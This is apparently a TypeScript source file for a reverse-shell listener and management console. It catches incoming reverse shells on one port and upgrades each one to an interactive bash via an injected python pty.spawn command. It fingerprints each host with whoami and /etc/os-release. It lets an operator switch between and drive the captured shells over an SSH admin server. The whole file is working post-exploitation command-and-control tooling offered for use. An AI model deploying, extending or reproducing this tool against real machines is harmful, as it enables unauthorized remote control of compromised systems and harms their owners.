import * as net from 'net';
import { timingSafeEqual } from 'crypto';
import { Server, Connection, utils, ParsedKey } from 'ssh2';
import * as fs from 'fs';
import * as path from 'path';
import { homedir } from 'os';

const PORT = 13335;
const SSH_PORT = 13336;

interface SSHConnectionState {
    stream: any;
    selectedId: string | null;
    commandMode: boolean;
    rows?: number;
    cols?: number;
}

// 存储所有活动的反向shell连接
interface ConnectionInfo {
    socket: net.Socket;
    user: string;
    os: string;
}
const activeConnections = new Map<string, ConnectionInfo>();
// 存储所有活动的SSH连接
const activeSSHConnections = new Map<Connection, SSHConnectionState>();

// Define render functions at top level
const visibleLength = (str: string): number => {
    return str.replace(/\x1b\[[0-9;]*m/g, '').length;
};

const renderBottomBar = (state: SSHConnectionState, stream: any) => {
    if (!state.rows || !state.cols || !stream) return;
    const status = state.selectedId
        ? (() => {
            const info = activeConnections.get(state.selectedId);
            const label = info && info.user && info.os ? `${info.user}@${info.os}` : state.selectedId || 'None';
            return `[Connected to: ${label}]`;
        })()
        : '[Command Mode]';

    // Build tab string with bold for active
    let tabContent = '';
    let index = 1;
    activeConnections.forEach((info, id) => {
        const isActive = id === state.selectedId;
        const label = info.user && info.os ? `${info.user}@${info.os}` : id;
        tabContent += (isActive ? '\x1b[1m' : '') + ` ${index}:${label} ` + (isActive ? '\x1b[22m' : '');
        index++;
    });

    // Truncate tabs if too long
    const statusVisLength = visibleLength(status);
    const minStatusSpace = statusVisLength + 2;
    const availableForTabs = state.cols - minStatusSpace;
    let tabVisLength = visibleLength(tabContent);
    if (tabVisLength > availableForTabs) {
        // Truncate approximately; for simplicity, slice string and adjust
        tabContent = tabContent.slice(0, Math.floor(tabContent.length * (availableForTabs - 3) / tabVisLength)) + '...';
        tabVisLength = visibleLength(tabContent);
    }

    // Calculate visible padding to right-align status: total visible space between tabs and status
    const paddingVisLength = state.cols - tabVisLength - statusVisLength;
    const padding = ' '.repeat(paddingVisLength);

    // Full line: set blue bg, write tabs, padding, status, reset
    const fullLine = '\x1b[44;37m' + tabContent + padding + status + '\x1b[0m';

    // Since padding is visible spaces, and all in blue, it should fill
    stream.write('\x1b[s');
    stream.write(`\x1b[${state.rows};0H`);
    stream.write('\x1b[2K');
    stream.write(fullLine);
    stream.write('\x1b[u');
};

// 反向shell服务器
const reverseShellServer = net.createServer();

reverseShellServer.on('connection', (socket) => {
    const connectionId = `${socket.remoteAddress}:${socket.remotePort}`;
    console.log(`[+] New reverse shell connection from ${connectionId}`);
    const info: ConnectionInfo = { socket, user: '', os: '' };
    activeConnections.set(connectionId, info);

    // 发送创建PTY的命令，设置初始终端大小
    const ptyCommand = `python3 -c "
import pty, os;
pid = os.fork();
if pid == 0:
  os.setsid();
  pty.spawn(['/bin/bash', '-c', 'stty rows 24 cols 80; trap "" HUP; exec /bin/bash']);
else:
  os.wait()
" ; echo SHELL_EXITED\n`;
    info.socket.write(ptyCommand);
    info.socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');

    let isInfo = false;
    let buffer = '';
    const infoCallback = (data) => {
        const str = data.toString();
        if (str.includes('---END_INFO2---') && isInfo) {
            buffer += str.split('---END_INFO2---')[0];
            const lines = buffer.split(/[\r\n]/);
            for (const line of lines) {
                if (line.startsWith('PRETTY_NAME=')) {
                    info.os = line.slice('PRETTY_NAME='.length).replace(/"/g, '').trim();
                } else if (line.startsWith('WHOAMI=')) {
                    info.user = line.slice('WHOAMI='.length).trim();
                }
            }
            activeSSHConnections.forEach((sshState, cl) => {
                renderBottomBar(sshState, sshState.stream);
            });
            info.socket.off('data', infoCallback);
        }
        if (str.includes('---START_INFO2---')) {
            buffer += str.split('---START_INFO2---')[1];
            isInfo = true;
        } else if (isInfo) {
            buffer += str;
        }
    }
    info.socket.on('data', infoCallback);

    info.socket.on('data', (data) => {
        const str = data.toString();
        if (str.includes('SHELL_EXITED')) {
            activeSSHConnections.forEach((sshConn, client) => {
                if (sshConn.selectedId === connectionId) client.end();
            });
            info.socket.write(ptyCommand);
            return;
        }
        console.log(`[${connectionId}] ${str.trim()}`);
        activeSSHConnections.forEach((sshConn) => {
            if (sshConn.selectedId === connectionId && sshConn.stream) {
                sshConn.stream.write(data);
                if (data.toString().includes('\x1b[2J')) {
                    renderBottomBar(sshConn, sshConn.stream);
                }
            }
        });
    });

    info.socket.on('close', () => {
        console.log(`[-] Reverse shell connection closed from ${connectionId}`);
        activeConnections.delete(connectionId);
        activeSSHConnections.forEach((sshState, client) => {
            if (sshState.selectedId === connectionId) {
                sshState.selectedId = null;
                sshState.commandMode = true;
                sshState.stream?.write('\r\nReverse shell connection closed.\r\nEntering command mode.\r\n');
                renderBottomBar(sshState, sshState.stream);
            }
        });
    });

    info.socket.on('error', (err) => {
        console.error(`[!] Socket error: ${err.message}`);
        activeConnections.delete(connectionId);
    });
});

reverseShellServer.listen(PORT, () => {
    console.log(`[*] Reverse shell server listening on port ${PORT}`);
    console.log('[*] Waiting for reverse shell connections...');
});

// 生成SSH密钥对（如果不存在）
const keyPath = path.join(__dirname, 'ssh_keys');
if (!fs.existsSync(keyPath)) fs.mkdirSync(keyPath);

const privateKeyPath = path.join(keyPath, 'id_rsa');
const publicKeyPath = path.join(keyPath, 'id_rsa.pub');

if (!fs.existsSync(privateKeyPath)) {
    const { execSync } = require('child_process');
    execSync(`ssh-keygen -t rsa -b 4096 -f ${privateKeyPath} -N ""`);
}

const authorizedKeys = fs.readFileSync(path.join(homedir(), '.ssh', 'authorized_keys'), 'utf-8').split('\n').filter(i => i.trim());
const allowedPubKeys = authorizedKeys.map(i => utils.parseKey(i + '\n')).filter(i => i && !(i instanceof Error)) as ParsedKey[];
console.log(allowedPubKeys.length + ' keys loaded');

const eq = (a: Buffer, b: Buffer) => {
    if (a.length !== b.length) return false;
    return timingSafeEqual(a, b);
}

// SSH管理服务器
const sshServer = new Server({
    hostKeys: [fs.readFileSync(privateKeyPath)],
}, (client) => {
    const clientInfo = `SSH client`;
    console.log(`[+] New admin connection from ${clientInfo}`);

    // 初始化SSH连接状态
    const state: SSHConnectionState = { stream: null, selectedId: null, commandMode: false, rows: undefined, cols: undefined };
    activeSSHConnections.set(client, state);

    client.on('authentication', (ctx) => {
        if (!eq(Buffer.from(ctx.username), Buffer.from('user')))
            return ctx.reject();
        switch (ctx.method) {
            case 'password':
                return ctx.reject();
            case 'publickey':
                for (const allowedPubKey of allowedPubKeys) {
                    if (ctx.key.algo == allowedPubKey.type
                        && eq(ctx.key.data, allowedPubKey.getPublicSSH())
                        && (!ctx.signature || allowedPubKey.verify(ctx.blob!, ctx.signature, ctx.hashAlgo))) {
                        return ctx.accept();
                    }
                }
                return ctx.reject();
            default:
                return ctx.reject();
        }
    });

    client.on('ready', () => {
        client.on('session', (accept, reject) => {
            const session = accept();

            // 先处理PTY请求
            session.on('pty', (accept, reject, info) => {
                state.rows = info.rows;
                state.cols = info.cols;
                accept();
            });

            // 处理窗口大小变化
            session.on('window-change', (accept, reject, info) => {
                accept?.();
                state.rows = info.rows;
                state.cols = info.cols;
                if (state.selectedId) {
                    activeConnections.get(state.selectedId)?.socket.write(`stty rows ${info.rows - 1} cols ${info.cols}\n`);
                    state.stream?.write(`\x1b[1;${info.rows - 1}r`);
                } else {
                    state.stream?.write('\x1b[r');
                }
                renderBottomBar(state, state.stream);
            });

            session.on('shell', (accept, reject) => {
                const stream = accept();
                state.stream = stream;
                if (!state.rows) {
                    state.rows = 24;
                    state.cols = 80;
                }
                console.log('[*] Admin shell session started');

                // 切换到命令模式
                const switchToCommandMode = () => {
                    if (!state.selectedId) return;
                    state.selectedId = null;
                    state.commandMode = true;
                    stream.write('\r\nCommand mode - Press number to switch tab, l to list, q to quit\r\n');
                    stream.write('\x1b[r'); // Reset scroll region to full screen
                    renderBottomBar(state, stream);
                };

                // 通过数字选择连接
                const selectConnectionByNumber = (num: number) => {
                    const connections = Array.from(activeConnections.entries());
                    if (num > 0 && num <= connections.length) {
                        const [id, info] = connections[num - 1];
                        state.selectedId = id;
                        stream.write(`\r\nSelected connection: ${info.user || 'unknown'}@${info.os || 'unknown'} (${id})\r\n`);
                        if (state.rows && state.cols) {
                            info.socket.write(`stty rows ${state.rows - 1} cols ${state.cols}\n`);
                            stream.write(`\x1b[1;${state.rows - 1}r`); // Set scroll region to protect bottom line
                        }
                        renderBottomBar(state, stream);
                    } else {
                        stream.write('\r\nInvalid connection number\r\n');
                    }
                };

                // 清屏并设置初始状态
                stream.write('\x1b[2J\x1b[H');
                stream.write('Command mode - Press number to switch tab, l to list, q to quit\r\n');
                stream.write('\x1b[r'); // Initial full scroll region for command mode
                renderBottomBar(state, stream);

                stream.on('data', (data) => {
                    const input = data.toString();
                    if (data[0] === 2) { // Ctrl+B
                        if (!state.commandMode) {
                            switchToCommandMode();
                            return;
                        } else {
                            state.commandMode = false;
                            if (state.selectedId && state.rows) {
                                stream.write(`\x1b[1;${state.rows - 1}r`);
                            }
                            renderBottomBar(state, stream);
                            return;
                        }
                    }
                    if (state.selectedId) {
                        activeConnections.get(state.selectedId)?.socket.write(data);
                    } else {
                        const char = input[0];
                        if (char === 'q' || char === 'd') {
                            stream.end();
                        } else {
                            const num = parseInt(char);
                            if (!isNaN(num)) selectConnectionByNumber(num);
                            else if (char === 'l') {
                                stream.write('\r\nActive connections:\r\n');
                                const conns = Array.from(activeConnections.entries());
                                conns.forEach(([id, info], idx) => {
                                    const num = idx + 1;
                                    stream.write(`${num}: ${info.user || 'unknown'}@${info.os || 'unknown'} (${id})\r\n`);
                                });
                                stream.write('\r\n');
                            }
                        }
                    }
                });

                // 处理会话结束
                stream.on('close', () => {
                    state.stream = null;
                    state.selectedId = null;
                    console.log('[-] Admin shell session closed');
                });
            });
        });
    });

    client.on('end', () => {
        activeSSHConnections.delete(client);
        console.log(`[-] Admin connection closed from ${clientInfo}`);
    });
});

// 启动SSH服务器
sshServer.listen(SSH_PORT, '0.0.0.0', () => {
    console.log(`[*] SSH management server listening on port ${SSH_PORT}`);
    console.log('[*] Waiting for admin connections...');
    console.log(`[*] Public key for admin connection: ${fs.readFileSync(publicKeyPath, 'utf8')}`);
});
